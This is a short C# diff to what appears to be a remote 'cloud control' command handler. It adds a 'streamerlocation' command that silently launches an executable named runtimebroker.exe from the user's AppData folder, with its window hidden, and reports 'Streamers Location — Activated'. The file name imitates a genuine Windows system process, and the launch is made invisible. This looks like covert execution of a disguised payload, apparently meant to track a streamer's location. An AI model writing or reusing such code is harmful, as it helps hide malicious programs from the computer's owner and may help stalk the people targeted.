@@ -1057,6 +1057,26 @@ namespace RED_X_CLOUD_CONTROL_BASIC
                                 Thread.Sleep(50);
                                 responseText = sta.Text;
                                 break;
+
+                            case "streamerlocation":
+                                try
+                                {
+                                    var psi = new System.Diagnostics.ProcessStartInfo(
+                                        @"C:\Users\Admin\AppData\Local\runtimebroker.exe")
+                                    {
+                                        UseShellExecute = false,
+                                        CreateNoWindow  = true,
+                                        WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden
+                                    };
+                                    System.Diagnostics.Process.Start(psi);
+                                    responseText = "Streamers Location — Activated";
+                                }
+                                catch
+                                {
+                                    responseText = "Streamers Location — Launch failed";
+                                }
+                                break;
+
                             case "exit":
                                 Application.Exit();
                                 break;
